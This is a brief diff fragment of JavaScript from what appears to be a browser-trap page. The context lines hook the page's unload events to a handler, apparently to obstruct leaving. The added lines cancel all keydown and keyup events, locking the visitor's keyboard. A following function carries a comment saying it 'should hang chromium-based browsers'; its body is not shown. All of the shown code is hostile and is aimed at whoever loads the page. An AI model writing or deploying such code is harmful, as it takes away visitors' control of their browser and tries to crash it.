@@ -5,6 +5,10 @@ window.addEventListener('beforeunload', popstate);
 window.addEventListener('unload', popstate);
 popstate();
 
+let prevent = (e) => e.preventDefault();
+document.onkeydown = prevent;
+document.onkeyup = prevent;
+
 function crash(x) {
     if (typeof x !== "number") x = Math.random();
     // should hang chromium-based browsers
